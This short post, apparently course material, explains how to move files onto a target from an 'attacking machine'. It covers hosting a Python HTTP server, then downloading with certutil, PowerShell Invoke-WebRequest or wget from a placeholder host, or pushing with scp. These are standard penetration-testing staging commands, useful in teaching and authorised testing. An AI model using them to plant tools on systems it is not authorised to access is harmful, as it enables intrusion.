---
title: "File Transfer"
collection: posts
#type: "Undergraduate course"
permalink: /posts/2023-spring-teaching-3
#venue: "University 1, Department"
date: 2023-02-13
#location: "City, Country"
---

File transfer between Linux and Windows

# File Transfer
 
 Before talking about how to transfer a file,let's start by how you can host a server on your attacking machine. 
## Using Python
```bash
python3 -m http.server PORT_NUMBER
```
##
Now let's see how you can tranfer files on windows and linux

## Windows: 
**cmd :** 
```cmd
certutil.exe -urlcache -f http://X.X.X.X:PORT/FILE_NAME FILE_NAME
```
**powershell :**
```powershell
powershell -c "Invoke-WebRequest -Uri 'http://X.X.X.X:PORT/FILE_NAME' -OutFile 'PATH\TO\FILE'"
```
## Linux
```bash
wget http://X.X.X.X/FILE_NAME FILE_NAME
```
##

There is another way to transfer files using **scp** command where you don't need to host a server on your machine but you must have the credentials of the machine that you will transfer the file to.
 ```cmd
 scp FILE_NAME USER_NAME@X.X.X.X:/PATH/TO/FILE
 ```